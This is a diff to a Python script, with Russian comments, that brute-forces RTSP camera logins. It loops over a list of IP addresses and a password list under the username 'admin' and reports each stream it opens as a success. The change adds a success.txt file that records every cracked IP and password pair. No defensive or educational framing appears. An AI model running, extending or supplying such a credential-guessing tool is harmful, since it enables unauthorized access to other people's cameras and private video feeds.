@@ -3,6 +3,7 @@ import os
 
 ips_file = "rtsp.txt"
 passwords_file = "pas.txt"
+success_file = "success.txt"
 username = "admin"
 
 # Проверка файлов
@@ -19,6 +20,9 @@ with open(ips_file, "r") as f:
 with open(passwords_file, "r") as f:
     passwords = [line.strip() for line in f if line.strip()]
 
+# Очистка success.txt перед началом
+open(success_file, "w").close()
+
 # Перебор IP и паролей
 for ip in ips:
     print(f"\n[~] Проверка IP: {ip}")
@@ -29,6 +33,8 @@ for ip in ips:
 
         if cap.isOpened():
             print(f" [+] УСПЕХ! IP: {ip} | Пароль: {password}")
+            with open(success_file, "a") as success:
+                success.write(f"{ip} : {password}\n")
             cap.release()
             break  # переход к следующему IP
         cap.release()
